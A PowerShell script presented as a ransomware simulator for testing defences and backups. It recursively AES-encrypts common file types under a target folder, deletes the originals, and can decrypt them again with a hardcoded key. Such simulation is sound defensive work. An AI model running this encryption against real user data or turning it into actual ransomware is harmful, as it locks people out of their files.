function Invoke-RanSim {
    <#
    .SYNOPSIS
        Ransomware Simulator using AES to recursively encrypt or decrypt files at a given path

    .DESCRIPTION
        This function is intended to be used to test your defenses and backups against ransomware in a controlled environment. 
        You can encrypt fake data for your simulation, but you also have the option to decrypt the files with the same function if needed.

    .EXAMPLE
        Invoke-RanSim -Mode "encrypt"
        Invoke-RanSim -Mode "decrypt"

    .PARAMETER Mode
        Required parameter specifying whether to encrypt or decrypt files

    .PARAMETER TargetPath
        Optional parameter specifying the path that the recursive encryption will start in. Defaults to "C:\RanSim"
 
    .PARAMETER Extension
        Optional parameter defining the extension added to encrypted files. Defaults to ".encrypted"

    .PARAMETER Key
        Optional parameter for the plain-text AES encryption key used for both encryption and decryption. 
        Defaults to "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="

    .NOTES
        This function uses the FileCryptopgraphy module from Tyler Siegrist - 
        https://gallery.technet.microsoft.com/scriptcenter/EncryptDecrypt-files-use-65e7ae5d
    #>

    param(
        [Parameter(Mandatory=$true)]
        [ValidateSet("encrypt", "decrypt")]
        [string]$Mode,
        
        [string]$TargetPath = "C:\RanSim",
        
        [string]$Extension = ".encrypted",
        
        [string]$Key = "Q5KyUru6wn82hlY9k8xUjJOPIC9da41jgRkpt21jo2L="
    )

    # Define target file types
    $TargetFiles = '*.pdf','*.xls*','*.ppt*','*.doc*','*.accd*','*.rtf','*.txt','*.csv','*.jpg','*.jpeg','*.png','*.gif','*.avi','*.midi','*.mov','*.mp3','*.mp4','*.mpeg','*.mpeg2','*.mpeg3','*.mpg','*.ogg'

    # Import FileCryptography module
    Import-Module "$PSScriptRoot\FileCryptography.psm1"

    if ($Mode -eq "encrypt") {
        # Gather all files from the target path and its subdirectories
        $FilesToEncrypt = Get-ChildItem -Path $TargetPath\* -Include $TargetFiles -Exclude *$Extension -Recurse -Force | Where-Object { ! $_.PSIsContainer }
        $NumFiles = $FilesToEncrypt.Length

        # Encrypt the files
        foreach ($file in $FilesToEncrypt) {
            Write-Host "Encrypting $file"
            Protect-File $file -Algorithm AES -KeyAsPlainText $Key -Suffix $Extension -RemoveSource
        }
        Write-Host "Encrypted $NumFiles files." 
        Start-Sleep -Seconds 10
    }
    elseif ($Mode -eq "decrypt") {
        # Gather all files from the target path and its subdirectories
        $FilesToDecrypt = Get-ChildItem -Path $TargetPath\* -Include *$Extension -Recurse -Force | Where-Object { ! $_.PSIsContainer }

        # Decrypt the files
        foreach ($file in $FilesToDecrypt) {
            Write-Host "Decrypting $file"
            Unprotect-File $file -Algorithm AES -KeyAsPlainText $Key -Suffix $Extension -RemoveSource
        }
    }
    else {
        Write-Host "ERROR: Invalid mode specified. Use 'encrypt' or 'decrypt'."
    }
}
